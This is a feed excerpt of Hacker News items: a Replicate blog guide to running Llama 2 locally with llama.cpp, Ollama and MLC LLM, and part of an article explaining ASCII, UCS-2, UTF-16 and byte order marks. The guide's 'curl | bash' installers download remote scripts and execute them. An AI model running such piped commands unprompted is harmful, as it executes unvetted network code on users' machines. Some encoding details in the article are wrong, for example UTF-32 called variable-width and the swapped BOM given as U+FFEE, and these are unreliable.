<p dir="auto">I‚Äôm also grateful for the bug reports and discussion about the implementation
  contributed by Takahiro Itazuri and Kuniyuki Iwashima.</p>
<h2 tabindex="-1" dir="auto">Contribution</h2>
<p dir="auto">This is a learning project for me, and I will not be accepting pull requests
  until I consider the implementation complete. However, discussions and advice
  are welcome.</p>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Guide to running Llama 2 locally (422 pts)]]></title>
            <link>https://replicate.com/blog/run-llama-locally</link>
            <guid>36865495</guid>
            <pubDate>Tue, 25 Jul 2023 16:58:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://replicate.com/blog/run-llama-locally">https://replicate.com/blog/run-llama-locally</a>, See on <a href="https://news.ycombinator.com/item?id=36865495">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    <p>We‚Äôve been talking a lot about <a href="https://replicate.com/blog/llama-2-roundup">how to run</a> and <a href="https://replicate.com/blog/fine-tune-llama-2">fine-tune Llama 2</a> on Replicate. But you can also run Llama locally on your M1/M2 Mac, on Windows, on Linux, or even your phone. The cool thing about running Llama 2 locally is that you don‚Äôt even need an internet connection.</p>
<p>Here‚Äôs an example using a locally-running Llama 2 to whip up a website about why llamas are cool:</p>
<video controls="" src="https://replicate.com/static/blog/run-llama-locally/why-llamas-are-cool.mp4"></video>

<p>It‚Äôs only been a couple days since Llama 2 was released, but there are already a handful of techniques for running it locally. In this blog post we‚Äôll cover three open-source tools you can use to run Llama 2 on your own devices:</p>
<ul>
<li>Llama.cpp (Mac/Windows/Linux)</li>
<li>Ollama (Mac)</li>
<li>MLC LLM (iOS/Android)</li>
</ul>
<h2 id="llamacpp-macwindowslinux">Llama.cpp (Mac/Windows/Linux)</h2>
<p><a href="https://github.com/ggerganov/llama.cpp">Llama.cpp</a> is a port of Llama in C/C++, which makes it possible to run Llama 2 locally using 4-bit integer quantization on Macs. However, Llama.cpp also has support for Linux/Windows.</p>
<p>Here‚Äôs a one-liner you can use to install it on your M1/M2 Mac:</p>
<pre><code>curl -L "https://replicate.fyi/install-llama-cpp" | bash
</code></pre>
<p>Here‚Äôs what that one-liner does:</p>
<pre><code>#!/bin/bash

# Clone llama.cpp
git clone https://github.com/ggerganov/llama.cpp.git
cd llama.cpp

# Build it. `LLAMA_METAL=1` allows the computation to be executed on the GPU
LLAMA_METAL=1 make

# Download model
export MODEL=llama-2-13b-chat.ggmlv3.q4_0.bin
if [ ! -f models/${MODEL} ]; then
    curl -L "https://huggingface.co/TheBloke/Llama-2-13B-chat-GGML/resolve/main/${MODEL}" -o models/${MODEL}
fi

# Set prompt
PROMPT="Hello! How are you?"

# Run in interactive mode
./main -m ./models/llama-2-13b-chat.ggmlv3.q4_0.bin \
  --color \
  --ctx_size 2048 \
  -n -1 \
  -ins -b 256 \
  --top_k 10000 \
  --temp 0.2 \
  --repeat_penalty 1.1 \
  -t 8
</code></pre>
<p>Here's a one-liner for your intel Mac, or Linux machine. It's the same as above, but we're not including the <code>LLAMA_METAL=1</code> flag:</p>
<pre><code>curl -L "https://replicate.fyi/install-llama-cpp-cpu" | bash
</code></pre>
<p>Here's a one-liner to run on Windows:</p>
<pre><code>curl -L "https://replicate.fyi/windows-install-llama-cpp" | bash
</code></pre>
<h2 id="ollama-mac">Ollama (Mac)</h2>
<p><a href="https://ollama.ai/">Ollama</a> is an open-source macOS app (for Apple Silicon) that lets you run, create, and share large language models with a command-line interface. Ollama already has support for Llama 2.</p>
<p>To use the Ollama CLI, download the macOS app at <a href="https://ollama.ai/download">ollama.ai/download</a>. Once you've got it installed, you can download Lllama 2 without having to register for an account or join any waiting lists. Run this in your terminal:</p>
<pre><code># download the 7B model (3.8 GB)
ollama pull llama2

# or the 13B model (7.3 GB)
ollama pull llama2:13b
</code></pre>
<p>Then you can run the model and chat with it:</p>
<pre><code>ollama run llama2
&gt;&gt;&gt; hi
Hello! How can I help you today?
</code></pre>
<p>Note: Ollama recommends that have at least 8 GB of RAM to run the 3B models, 16 GB to run the 7B models, and 32 GB to run the 13B models.</p>
<h2 id="mlc-llm-llama-on-your-phone">MLC LLM (Llama on your phone)</h2>
<p><a href="https://github.com/mlc-ai/mlc-llm">MLC LLM</a> is an open-source project that makes it possible to run language models locally on a variety of devices and platforms, including iOS and Android.</p>
<p>For iPhone users, there‚Äôs an <a href="https://apps.apple.com/us/app/mlc-chat/id6448482937">MLC chat app</a> on the App Store. MLC now has support for the 7B, 13B, and 70B versions of Llama 2, but it‚Äôs still in beta and not yet on the Apple Store version, so you‚Äôll need to install TestFlight to try it out. Check out out the <a href="https://mlc.ai/mlc-llm/docs/get_started/try_out.html">instructions for installing the beta version here</a>.</p>
<h2 id="next-steps">Next steps</h2>
<ul>
<li>We'd love to see what you build. <a href="https://discord.gg/replicate">Hop in our Discord and share it with our community.</a></li>
<li>Replicate lets you run machine learning models in the cloud. Run Llama 2 on Replicate:<ul>
<li><a href="https://replicate.com/a16z-infra/llama7b-v2-chat">a16z-infra/llama7b-v2-chat</a></li>
<li><a href="https://replicate.com/a16z-infra/llama13b-v2-chat">a16z-infra/llama13b-v2-chat</a></li>
<li><a href="https://replicate.com/replicate/llama70b-v2-chat">replicate/llama70b-v2-chat</a></li>
</ul>
</li>
<li><a href="https://replicate.com/blog/fine-tune-llama-2">Fine-tune Llama 2 on Replicate</a></li>
</ul>
<p>Happy hacking! ü¶ô</p>
  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Unicode is harder than you think (112 pts)]]></title>
            <link>https://mcilloni.ovh/2023/07/23/unicode-is-hard/</link>
            <guid>36865287</guid>
            <pubDate>Tue, 25 Jul 2023 16:47:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mcilloni.ovh/2023/07/23/unicode-is-hard/">https://mcilloni.ovh/2023/07/23/unicode-is-hard/</a>, See on <a href="https://news.ycombinator.com/item?id=36865287">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
  
  <p><span>23 Jul 2023</span></p><p>Reading the excellent article by JeanHeyd Meneide on <a href="https://thephd.dev/the-c-c++-rust-string-text-encoding-api-landscape">how broken string encoding in C/C++ is</a> made me realise that Unicode is a topic that is often overlooked by a large number of developers. In my experience, there‚Äôs a lot of confusion and wrong expectations on what Unicode is, and what best practices to follow when dealing with strings that may contain characters outside of the ASCII range.</p>

<p>This article attempts to briefly summarise and clarify some of the most common misconceptions I‚Äôve seen people struggle with, and some of the pitfalls that tend to recur in codebases that have to deal with non-ASCII text.</p>

<h2 id="the-convenience-of-ascii">The convenience of ASCII</h2>

<p>Text is usually represented and stored as a sequence of numerical values in binary form. Wherever its source is, to be represented in a way the user can understand it needs to be decoded from its binary representation, as specified by a given <strong>character encoding</strong>.</p>

<p>One such example of this is ASCII, the US-centric standard which has been for decades the de-facto way to represent characters and symbols in C and UNIX. ASCII is a 7-bit encoding, which means that it can represent up to 128 different characters. The first 32 characters are control characters, which are not printable, and the remaining 96 are printable characters, which include the 26 letters of the English alphabet, the 10 digits, and a few symbols:</p>

<div><pre><code>Dec Hex    Dec Hex    Dec Hex  Dec Hex  Dec Hex  Dec Hex   Dec Hex   Dec Hex  
  0 00 NUL  16 10 DLE  32 20    48 30 0  64 40 @  80 50 P   96 60 `  112 70 p
  1 01 SOH  17 11 DC1  33 21 !  49 31 1  65 41 A  81 51 Q   97 61 a  113 71 q
  2 02 STX  18 12 DC2  34 22 "  50 32 2  66 42 B  82 52 R   98 62 b  114 72 r
  3 03 ETX  19 13 DC3  35 23 #  51 33 3  67 43 C  83 53 S   99 63 c  115 73 s
  4 04 EOT  20 14 DC4  36 24 $  52 34 4  68 44 D  84 54 T  100 64 d  116 74 t
  5 05 ENQ  21 15 NAK  37 25 %  53 35 5  69 45 E  85 55 U  101 65 e  117 75 u
  6 06 ACK  22 16 SYN  38 26 &amp;  54 36 6  70 46 F  86 56 V  102 66 f  118 76 v
  7 07 BEL  23 17 ETB  39 27 '  55 37 7  71 47 G  87 57 W  103 67 g  119 77 w
  8 08 BS   24 18 CAN  40 28 (  56 38 8  72 48 H  88 58 X  104 68 h  120 78 x
  9 09 HT   25 19 EM   41 29 )  57 39 9  73 49 I  89 59 Y  105 69 i  121 79 y
 10 0A LF   26 1A SUB  42 2A *  58 3A :  74 4A J  90 5A Z  106 6A j  122 7A z
 11 0B VT   27 1B ESC  43 2B +  59 3B ;  75 4B K  91 5B [  107 6B k  123 7B {
 12 0C FF   28 1C FS   44 2C ,  60 3C &lt;  76 4C L  92 5C \  108 6C l  124 7C |
 13 0D CR   29 1D GS   45 2D -  61 3D =  77 4D M  93 5D ]  109 6D m  125 7D }
 14 0E SO   30 1E RS   46 2E .  62 3E &gt;  78 4E N  94 5E ^  110 6E n  126 7E ~
 15 0F SI   31 1F US   47 2F /  63 3F ?  79 4F O  95 5F _  111 6F o  127 7F DEL
</code></pre></div>

<p>This table defines a two-way transformation, in jargon a <strong>charset</strong>, which maps a certain sequence of bits (representing a number) to a given character, and vice versa. This can be easily seen by dumping some text as binary:</p>

<div><pre><code><span>$ </span><span>echo</span> <span>-n</span> Cat! | xxd
00000000: 4361 7421                                Cat!
</code></pre></div>

<p>The first column represents the binary representation of the input string ‚ÄúCat!‚Äù in hexadecimal form. Each character is mapped into a single byte (represented here as two hexadecimal digits):</p>

<ul>
  <li><code>43</code> is the hexadecimal representation of the ASCII character <code>C</code>;</li>
  <li><code>61</code> is the hexadecimal representation of the ASCII character <code>a</code>;</li>
  <li><code>74</code> is the hexadecimal representation of the ASCII character <code>t</code>;</li>
  <li><code>21</code> is the hexadecimal representation of the ASCII character <code>!</code>.</li>
</ul>

<p>This simple set of characters was for decades considered more than enough by most of the English-speaking world, which was where the vast majority of computer early computer users and pioneers came from.</p>

<p>An added benefit of ASCII is that it is a <strong>fixed-width encoding</strong>: each character is always represented <em>univocally</em> by the same number of bits, that in turn always represent the same number.</p>

<p>This leads to some very convenient ergonomics when handling strings in C:</p>

<div><pre><code><span>#include &lt;ctype.h&gt;
#include &lt;stdio.h&gt;
</span>
<span>int</span> <span>main</span><span>(</span><span>const</span> <span>int</span> <span>argc</span><span>,</span> <span>const</span> <span>char</span> <span>*</span><span>argv</span><span>[</span><span>const</span><span>])</span> <span>{</span>
    <span>// converts all arguments to uppercase</span>
    <span>for</span> <span>(</span><span>const</span> <span>char</span> <span>*</span><span>const</span> <span>*</span><span>arg</span> <span>=</span> <span>argv</span> <span>+</span> <span>1</span><span>;</span> <span>*</span><span>arg</span><span>;</span> <span>++</span><span>arg</span><span>)</span> <span>{</span>
        <span>// iterate over each character in the string, and print its uppercase</span>
        <span>for</span> <span>(</span><span>const</span> <span>char</span> <span>*</span><span>it</span> <span>=</span> <span>*</span><span>arg</span><span>;</span> <span>*</span><span>it</span><span>;</span> <span>++</span><span>it</span><span>)</span> <span>{</span>
            <span>putchar</span><span>(</span><span>toupper</span><span>(</span><span>*</span><span>it</span><span>));</span>
        <span>}</span>

        <span>if</span> <span>(</span><span>*</span><span>(</span><span>arg</span> <span>+</span> <span>1</span><span>))</span> <span>{</span>
            <span>putchar</span><span>(</span><span>' '</span><span>);</span>
        <span>}</span>
    <span>}</span>

    <span>if</span> <span>(</span><span>argc</span> <span>&gt;</span> <span>1</span><span>)</span> <span>{</span>
        <span>putchar</span><span>(</span><span>'\n'</span><span>);</span>
    <span>}</span>

    <span>return</span> <span>0</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>The example above assumes, like a large amount of code written in the last few decades, that the C basic type <code>char</code> represents a byte-sized ASCII character. This assumption minimises the mental and runtime overhead of handling text, as strings can be treated as arrays of characters belonging to a very minimal set. Because of this, ASCII strings can be iterated on, addressed individually and transformed or inspected using simple, cheap operations such as <code>isalpha</code> or <code>toupper</code>.</p>

<h2 id="the-world-outside">The world outside</h2>

<p>However, as computers started to spread worldwide it became clear that it was necessary to devise character sets capable to represent all the characters required in a given locale. For instance, Spanish needs the letter <code>√±</code>, Japan needs the <code>¬•</code> symbol and support for Kana and Kanji, and so on.</p>

<p>All of this led to a massive proliferation of different character encodings, usually tied to a given language, area or locale. These varied from 8-bit encodings, which either extended ASCII by using its unused eighth bit (like <strong>ISO-8859-1</strong>) or completely replaced its character set (like <strong>KOI8-R</strong>), to multi-byte encodings for Asian languages with thousands of characters like <strong>Shift-JIS</strong> and <strong>Big5</strong>.</p>

<p>This turned into a huge headache for both developers and users, as it was necessary to know (or deduce via hacky heuristics) which encoding was used for a given piece of text, for instance when receiving a file from the Internet, which was becoming more and more common thanks to email, IRC and the World Wide Web.</p>

<p>Most crucially, multibyte encodings (a necessity for Asian characters) meant that <em>the assumption ‚Äúone char = one byte‚Äù didn‚Äôt hold anymore</em>, with the small side effect of breaking all code in existence at the time.</p>

<p>For a while, the most common solution was to use a single encoding for each language, and then hope for the best. This often led to garbled text (who hasn‚Äôt seen the infamous <code>ÔøΩ</code> character at least once), so much so that a specific term was coined to describe it - <em>‚Äúmojibake‚Äù</em>, from the Japanese <em>‚ÄúÊñáÂ≠óÂåñ„Åë‚Äù _(‚Äúcharacter transformation‚Äù)</em>.</p>

<p><img src="https://mcilloni.ovh/public/mojibake.jpg" alt="KOI8-R text mistakenly written on an envelope as ISO-8859-1 text" title="I guess they thought it was actual Russian text"></p>

<p>In general, for a long time using a non-English locale meant that you had to contend with broken third (often first) party software, patchy support for certain characters, and switching encodings on the fly depending on the context. The inconvenience was such that it was common for non-Latin Internet users to converse in their native languages with the Latin alphabet, using impromptu transliterations if necessary. A prime example of this was the Arabic chat alphabet widespread among Arabic-speaking netizens in the 90‚Äôs and 00‚Äôs <sup id="fnref:1" role="doc-noteref"><a href="#fn:1" rel="footnote">1</a></sup>.</p>

<h2 id="unicode">Unicode</h2>

<p>It was clear to most people back then that the situation as it was untenable, so much so that as early as the late ‚Äô80s people started proposing a universal character encoding capable to cover all modern scripts and symbols in use.</p>

<p>This led to the creation of <strong>Unicode</strong>, whose first version was standardised in 1991 after a few years of joint development led by Xerox and Apple (among others). Unicode main design goal was, and still is, to define a universal <strong>character set</strong> capable to represent all the aforementioned characters, alongside a <strong>character encoding</strong> capable of uniformly representing them all.</p>

<p>In Unicode, every character, or more properly <strong>code point</strong>, is represented by a unique number, belonging to a specific <strong>Unicode block</strong>. Crucially, the first block of Unicode (‚ÄúBasic Latin‚Äù) corresponds point per point to ASCII, so that <em>all ASCII characters correspond to equivalent Unicode codepoints</em>.</p>

<p>Code points are usually represented with the syntax <code>U+XXXX</code>, where <code>XXXX</code> is the hexadecimal representation of the code point. For instance, the code point for the <code>A</code> character is <code>U+0041</code>, while the code point for the <code>√±</code> character is <code>U+00F1</code>.</p>

<p>Unicode 1.0 covered 26 scripts and 7,161 characters, covering most of the world‚Äôs languages and lots of commonplace symbols and glyphs.</p>

<h2 id="ucs-2-or-how-unicode-made-everything-worse">UCS-2, or <em>‚Äúhow Unicode made everything worse‚Äù</em></h2>

<p>Alongside the first Unicode specification, which defined the character set, two<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" rel="footnote">2</a></sup> new character encodings, called <strong>UCS-2</strong> and <strong>UCS-4</strong> (which came a bit later), were also introduced. UCS-2 was the original Unicode encoding, and it‚Äôs an extension of ASCII to 16 bits, representing what Unicode called the <strong>Basic Multilingual Plane</strong> (<em>‚ÄúBMP‚Äù</em>); UCS-4 is the same but with 32-bit values. Both were fixed-width encodings, using multiple bytes to represent each single character in a string.</p>

<p>In particular, UCS-2‚Äôs maximum range of 65,536 possible values was good enough to cover the entire Unicode 1.0 set of characters. The storage savings compared with UCS-4 were quite enticing, also - while ‚Äô90s machines weren‚Äôt as constrained as the ones that came before, representing basic Latin characters with 4 bytes was still seen as an egregious waste.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" rel="footnote">3</a></sup></p>

<p>Thus, 16 bits quickly became the standard size for the <code>wchar_t</code> type recently added by the C89 standard to support wide characters for encodings like Shift-JIS. Sure, switching from <code>char</code> to <code>wchar_t</code> required developers to rewrite all code to use wide characters and wide functions, but a bit of <code>sed</code> was a small price to pay for the ability to resolve internationalization, right?</p>

<p>The C library had also introduced, alongside the new wide char type, a set of functions and types to handle <code>wchar_t</code>, wide strings and (poorly designed) functions locale support, including support for multibyte encodings. Some vendors, like Microsoft, even devised tricks to make it possible to optionally switch from legacy 8-bit codepages to UCS-2 by using ad-hoc types like <code>TCHAR</code> and <code>LPTSTR</code> in place of specific character types.</p>

<p>All of that said, the code snippet above could be rewritten on Win32 as the following:</p>

<div><pre><code><span>#include &lt;ctype.h&gt;
#include &lt;tchar.h&gt;
</span>
<span>#if !defined(_UNICODE) &amp;&amp; !defined(UNICODE)
#   include &lt;stdio.h&gt;
#endif
</span>
<span>int</span> <span>_tmain</span><span>(</span><span>const</span> <span>int</span> <span>argc</span><span>,</span> <span>const</span> <span>TCHAR</span> <span>*</span><span>argv</span><span>[</span><span>const</span><span>])</span> <span>{</span>
    <span>// converts all arguments to uppercase</span>
    <span>for</span> <span>(</span><span>const</span> <span>TCHAR</span> <span>*</span><span>const</span> <span>*</span><span>arg</span> <span>=</span> <span>argv</span> <span>+</span> <span>1</span><span>;</span> <span>*</span><span>arg</span><span>;</span> <span>++</span><span>arg</span><span>)</span> <span>{</span>
        <span>// iterate over each character in the string, and print its uppercase</span>
        <span>for</span> <span>(</span><span>const</span> <span>TCHAR</span> <span>*</span><span>it</span> <span>=</span> <span>*</span><span>arg</span><span>;</span> <span>*</span><span>it</span><span>;</span> <span>++</span><span>it</span><span>)</span> <span>{</span>
            <span>_puttchar</span><span>(</span><span>_totupper</span><span>(</span><span>*</span><span>it</span><span>));</span>
        <span>}</span>

        <span>if</span> <span>(</span><span>*</span><span>(</span><span>arg</span> <span>+</span> <span>1</span><span>))</span> <span>{</span>
            <span>_puttchar</span><span>(</span><span>_T</span><span>(</span><span>' '</span><span>));</span>
        <span>}</span>
    <span>}</span>

    <span>_puttchar</span><span>(</span><span>_T</span><span>(</span><span>'\n'</span><span>));</span>
    <span>return</span> <span>0</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>Neat, right? This was indeed considered so convenient that developers jumped on the UCS-2 bandwagon in droves, finally glad the encoding mess was over.</p>

<p>16-bit Unicode was indeed a huge success, as attested by the number of applications and libraries that adopted it during the ‚Äô90s:</p>

<ul>
  <li>Windows NT, 2000 and XP used UCS-2 as their internal character encoding, and exposed it to developers via the Win32 API;</li>
  <li>Apple‚Äôs Cocoa, too, used UCS-2 as its internal character encoding for <code>NSString</code> and <code>unichar</code>;</li>
  <li>Sun‚Äôs Java used UCS-2 as its internal character encoding for all strings, even going as far as to define its String type as an array of 16-bit characters;</li>
  <li>Javascript, too, didn‚Äôt want to be left behind, and basically defined its String type the same way Java did;</li>
  <li>Qt, the popular C++ GUI framework, used UCS-2 as its internal character encoding, and exposed it to developers via the QString class;</li>
  <li>Unreal Engine just copied the WinAPI approach and used UCS-2 as its internal character encoding <sup id="fnref:5" role="doc-noteref"><a href="#fn:5" rel="footnote">4</a></sup></li>
</ul>

<p>and many more. Every once in a while, I still find out that some piece of code I frequently use is still using UCS-2 (or UTF-16, see later) internally. In general, every time you read something along the lines of ‚ÄúUnicode support‚Äù without any reference to UTF, there‚Äôs an almost 100% chance that it actually means ‚ÄúUCS-2‚Äù, or some borked variant of it.</p>

<h2 id="combining-characters">Combining characters</h2>

<p>Unicode supported since its first release the concept of <strong>combining characters</strong> (later better defined as <strong>grapheme clusters</strong>), which are clusters of characters meant to be combined with other characters in order to form a single unit by text processing tools.</p>

<p>In Unicode jargon, these are called <strong>composite sequences</strong> and were designed to allow Unicode to represent scripts like Arabic, which uses a lot of diacritics and other combining characters, without having to define a separate code point for each possible combination.</p>

<p>This could have been in principle a neat idea - grapheme clusters allow Unicode to save a massive amount of code points from being pointlessly wasted for easily combinable characters (just think about South Asian languages or Hangul). The real issue was that the Consortium, anxious to help with the transition to Unicode, did not want to drop support for dedicated codepoints for ‚Äúpreassembled‚Äù characters such as <code>√®</code> and <code>√±</code>, which were historically supported by the various extended ASCII encodings.</p>

<p>This led to Unicode supporting <strong>precomposed characters</strong>, which are codepoints that stand for <em>a glyph that also be represented using a grapheme cluster</em>. An example of this is the Extended Latin characters with accents or diacritics, which can all be represented by combining the base Latin character with the corresponding modifier, or by using a single code point.</p>

<p>For instance, let‚Äôs try testing out a few things with Python‚Äôs <code>unicodedata</code> and two seemingly identical strings, ‚Äúca√±a‚Äù and ‚ÄúcanÃÉa‚Äù (notice how they look the same):</p>

<div><pre><code><span>&gt;&gt;&gt;</span> <span>import</span> <span>unicodedata</span>
<span>&gt;&gt;&gt;</span> <span>a</span><span>,</span> <span>b</span> <span>=</span> <span>"ca√±a"</span><span>,</span> <span>"canÃÉa"</span>
<span>&gt;&gt;&gt;</span> <span>a</span> <span>==</span> <span>b</span>
<span>False</span>
</code></pre></div>

<p>Uh?</p>

<div><pre><code><span>&gt;&gt;&gt;</span> <span>a</span><span>,</span> <span>b</span>
<span>(</span><span>'ca√±a'</span><span>,</span> <span>'canÃÉa'</span><span>)</span>
<span>&gt;&gt;&gt;</span> <span>len</span><span>(</span><span>a</span><span>),</span> <span>len</span><span>(</span><span>b</span><span>)</span>
<span>(</span><span>4</span><span>,</span> <span>5</span><span>)</span>
</code></pre></div>

<p>The two strings are visually identical - they are rendered the same by our Unicode-enabled terminal - and yet, they do not evaluate as equal, and the <code>len()</code> function returns different lengths. This is because the <code>√±</code> in the second string is a grapheme cluster composed of the <code>U+006E LATIN SMALL LETTER N</code> and <code>U+0303 COMBINING TILDE</code> character, combined by terminal into a single character.</p>

<div><pre><code><span>&gt;&gt;&gt;</span> <span>list</span><span>(</span><span>a</span><span>),</span> <span>list</span><span>(</span><span>b</span><span>)</span>
<span>([</span><span>'c'</span><span>,</span> <span>'a'</span><span>,</span> <span>'√±'</span><span>,</span> <span>'a'</span><span>],</span> <span>[</span><span>'c'</span><span>,</span> <span>'a'</span><span>,</span> <span>'n'</span><span>,</span> <span>'ÃÉ'</span><span>,</span> <span>'a'</span><span>])</span>
<span>&gt;&gt;&gt;</span> <span>[</span><span>unicodedata</span><span>.</span><span>name</span><span>(</span><span>c</span><span>)</span> <span>for</span> <span>c</span> <span>in</span> <span>a</span><span>]</span>
<span>[</span><span>'LATIN SMALL LETTER C'</span><span>,</span> <span>'LATIN SMALL LETTER A'</span><span>,</span> <span>'LATIN SMALL LETTER N WITH TILDE'</span><span>,</span> <span>'LATIN SMALL LETTER A'</span><span>]</span>
<span>&gt;&gt;&gt;</span> <span>[</span><span>unicodedata</span><span>.</span><span>name</span><span>(</span><span>c</span><span>)</span> <span>for</span> <span>c</span> <span>in</span> <span>b</span><span>]</span>
<span>[</span><span>'LATIN SMALL LETTER C'</span><span>,</span> <span>'LATIN SMALL LETTER A'</span><span>,</span> <span>'LATIN SMALL LETTER N'</span><span>,</span> <span>'COMBINING TILDE'</span><span>,</span> <span>'LATIN SMALL LETTER A'</span><span>]</span>
</code></pre></div>

<p>This is obviously a big departure from the ‚Äústrings are just arrays of characters‚Äù model the average developer is used to:</p>

<ol>
  <li>Trivial comparisons like <code>a == b</code> or <code>strcmp(a, b)</code> <strong>are no longer trivial</strong>. A Unicode-aware algorithm must to be implemented, in order to actually compare the strings as they are rendered or printed;</li>
  <li>Random access to characters is no longer safe, because a single glyph can span over multiple code points, and thus over multiple array elements;</li>
</ol>

<h2 id="640k-16-bits-ought-to-be-enough-for-everyone"><em>‚Äù<del>640k</del> 16 bits ought to be enough for everyone‚Äù</em></h2>

<p>Anyone with any degree of familiarity with Asian languages will have noticed that 7,161 characters are way too small a number to include the tens of thousands of Chinese characters in existence. This is without counting minor and historical scripts, and the thousands of symbols and glyphs used in mathematics, music, and other fields.</p>

<p>In the years following 1991, the Unicode character set was thus expanded with tens of thousands of new characters, and it become quickly apparent that UCS-2 was soon going to run out of 16-bit code points.^6]</p>

<p>To circumvent this issue, the Unicode Consortium decided to expand the character set from 16 to 21 bits. This was a huge breaking change that basically meant <strong>obsoleting UCS-2</strong> (and thus breaking most software designed in the ‚Äô90s), just a few years after its introduction and widespread adoption.</p>

<p>While UCS-2 was still capable of representing anything inside the BMP, it became clear a new encoding was needed to support the growing set of characters in the UCS.</p>

<h2 id="utf">UTF</h2>

<p>The acronym <em>‚ÄúUTF‚Äù</em> stands for <em>‚ÄúUnicode Transformation Format‚Äù</em>, and represents a family of <strong>variable-width encodings</strong> capable to represent the whole Unicode character set, up to its hypothetical supported potential 2¬≤¬π characters. Compared to UCS, UTF encodings specify how a given stream of bytes can be converted into a sequence of Unicode code points, and vice versa (i.e., <em>‚Äútransformed‚Äù</em>).</p>

<p>Compared to a fixed-width encoding like UCS-2, a variable-width character encoding can employ a variable number of code units to encode each character. This bypasses the ‚Äúone code unit per character‚Äù limitation of fixed-width encodings, and allows representing a much larger number of characters - potentially, infinite, depending on how many <em>‚Äúlead units‚Äù</em> are reserved as markers for multiunit sequences.</p>

<p>Excluding the dead-on-arrival UTF-1, there are 4 UTF encodings in use today:</p>

<ul>
  <li>UTF-8, a variable-width encoding that uses 1-byte characters;</li>
  <li>UTF-16, a variable-width encoding that uses 2-byte characters;</li>
  <li>UTF-32, a variable-width encoding that uses 4-byte characters;</li>
  <li>UTF-EBCDIC, a variable-width encoding that uses 1-byte characters, designed to be used on IBM‚Äôs EBCDIC systems (note: I think it‚Äôs safe to argue that using EBCDIC in 2023 edges very close to being a felony).</li>
</ul>

<h3 id="utf-16">UTF-16</h3>

<p>To salvage the consistent investments made to support UCS-2, the Unicode Consortium created UTF-16 as a backward-compatible extension of UCS-2. When some piece of software advertises ‚Äúsupport for UNICODE‚Äù, it almost always means that some software supported UCS-2 and switched to UTF-16 sometimes later. <sup id="fnref:7" role="doc-noteref"><a href="#fn:7" rel="footnote">5</a></sup></p>

<p>Like UCS-2, UTF-16 can represent the entirety of the BMP using a single 16-bit value. Every codepoint above <code>U+FFFF</code> is represented using a pair of 16-bit values, called <strong>surrogate pairs</strong>. The first value (the <em>‚Äúhigh surrogate‚Äù</em>) is always a value in the range <code>U+D800</code> to <code>U+DBFF</code>, while the second value (the <em>‚Äúlow surrogate‚Äù</em>) is always a value in the range <code>U+DC00</code> to <code>U+DFFF</code>.</p>

<p>This, in practice, means that the range reserved for BMP characters never overlaps with surrogates, making it trivial to distinguish between a single 16-bit codepoint and a surrogate pair, which makes UTF-16 <a href="https://en.wikipedia.org/wiki/Self-synchronizing_code"><em>self-synchronizing</em></a> on 16-bit values.</p>

<p>Emojis are an example of characters that lie outside of the BMP; as such, they are always represented using surrogate pairs.
For instance, the character <code>U+1F600</code> (üòÄ) is represented in UTF-16 by the surrogate pair <code>[0xD83D, 0xDE00]</code>:</p>

<div><pre><code><span>&gt;&gt;&gt;</span> <span># pack the surrogate pair into bytes by hand, and then decode it as UTF-16
</span><span>&gt;&gt;&gt;</span> <span>bys</span> <span>=</span> <span>[</span><span>b</span> <span>for</span> <span>cp</span> <span>in</span> <span>(</span><span>0xD83D</span><span>,</span> <span>0xDE00</span><span>)</span> <span>for</span> <span>b</span> <span>in</span> <span>list</span><span>(</span><span>cp</span><span>.</span><span>to_bytes</span><span>(</span><span>2</span><span>,</span><span>'little'</span><span>))]</span>
<span>&gt;&gt;&gt;</span> <span>bys</span>
<span>[</span><span>61</span><span>,</span> <span>216</span><span>,</span> <span>0</span><span>,</span> <span>222</span><span>]</span>
<span>&gt;&gt;&gt;</span> <span>bytes</span><span>(</span><span>bys</span><span>).</span><span>decode</span><span>(</span><span>'utf-16le'</span><span>)</span>
<span>'üòÄ'</span>
</code></pre></div>

<h3 id="the-bom">The BOM</h3>

<p>Notice that in the example above I had to specify an endianness for the bytes (little-endian in this case) by writing <code>"utf-16le"</code> instead of just <code>"utf-16"</code>. This is due to the fact that <em>UTF-16 is actually two different (incompatible) encodings</em>, UTF-16LE and UTF-16BE, which differ in the endianness of the single codepoints. <sup id="fnref:8" role="doc-noteref"><a href="#fn:8" rel="footnote">6</a></sup></p>

<p>The standard calls for UTF-16 streams to start with a <strong>Byte Order Mark</strong> (BOM), represented by the special codepoint <code>U+FEFF</code>. Reading <code>0xFEFF</code> indicates that the endianness of a text block is the same as the endianness of the decoding system; reading those bytes flipped, as <code>0xFFFE</code>, indicates opposite endianness instead.</p>

<p>As an example, let‚Äôs assume a big-endian system has generated the sequence <code>[0xFE, 0xFF, 0x61, 0x00]</code>. <br>
All systems, LE or BE, will detect that the first two bytes are a surrogate pair, and read them as they are depending on their endianness. Then:</p>

<ul>
  <li>A <em>big-endian</em> system will decode <code>U+FEFF</code>, which is the BOM, and thus will assume the text is in UTF-16 in its same byte endianness (BE);</li>
  <li>A <em>little-endian</em> system will instead read <code>U+FFEE</code>, which is still the BOM but flipped, so it will assume the text is in the opposite endianness (BE in the case of an LE system).</li>
</ul>

<p>In both cases, the BOM allows the following character to be correctly parsed as <code>U+0061</code> (a.k.a. <code>a</code>).</p>

<p>If no BOM is detected, then most decoders will do as they please (despite the standard recommending to assume UTF-16BE), which most of the time means assuming the endianness of the system:</p>

<div><pre><code><span>&gt;&gt;</span> <span>import</span> <span>sys</span>
<span>&gt;&gt;&gt;</span> <span>sys</span><span>.</span><span>byteorder</span>
<span>'little'</span>
<span>&gt;&gt;&gt;</span> <span># BOM read as 0xFEFF and system is LE -&gt; will assume UTF-16LE
</span><span>&gt;&gt;&gt;</span> <span>bytes</span><span>([</span><span>0xFF</span><span>,</span> <span>0xFE</span><span>,</span> <span>0x61</span><span>,</span> <span>0x00</span><span>,</span> <span>0x62</span><span>,</span> <span>0x00</span><span>,</span> <span>0x63</span><span>,</span> <span>0x00</span><span>]).</span><span>decode</span><span>(</span><span>'utf-16'</span><span>)</span> 
<span>'abc'</span>
